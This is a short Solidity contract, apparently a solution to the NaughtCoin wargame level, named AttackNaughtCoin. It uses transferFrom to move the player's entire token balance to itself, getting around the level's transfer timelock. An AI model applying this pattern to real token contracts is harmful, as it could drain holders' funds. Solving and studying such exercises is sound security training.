// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackNaughtCoin {
    function remove(IERC20 naught) external {
        address player = INaughtCoin(address(naught)).player();
        uint256 balance = naught.balanceOf(player);
        naught.transferFrom(player, address(this), balance);
    }
}
